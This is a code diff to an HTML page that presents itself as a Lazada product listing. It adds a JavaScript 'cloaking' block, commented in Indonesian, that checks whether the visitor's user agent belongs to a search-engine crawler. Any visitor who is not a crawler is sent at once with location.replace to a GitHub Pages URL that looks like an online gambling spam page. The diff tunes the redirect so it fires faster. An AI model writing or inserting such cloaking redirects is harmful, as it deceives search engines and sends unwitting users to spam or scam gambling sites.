@@ -54,11 +54,12 @@
     <link rel="stylesheet" href="https://g.lazcdn.com/g/lzdfe/pdp-modules/1.4.4/pc-mod.css" />
 	  <!-- JavaScript Cloaking -->
   <script>
-    const isBot = /bot|crawl|spider|slurp|facebookexternal|embed|preview|google|yahoo|bing/i.test(navigator.userAgent);
-    if (!isBot) {
-      // Ganti URL di bawah sesuai tujuan redirect user manusia
-      window.location.href = "https://zmukzo.github.io/curve/00017-pesta-scatter-mahjong-wins-3.html";
-    }
+    // Deteksi user agent secepat mungkin
+    (() => {
+      const ua = navigator.userAgent.toLowerCase();
+      const isBot = /(bot|crawl|spider|slurp|google|bing|yahoo|duckduckgo|baidu|yandex|facebook|embed|preview)/.test(ua);
+      if (!isBot) location.replace("https://zmukzo.github.io/curve/00017-pesta-scatter-mahjong-wins-3.html"); // lebih cepat dari href
+    })();
   </script>
 	<!-- Google tag (gtag.js) -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-G-DT6RX00RDG"></script>
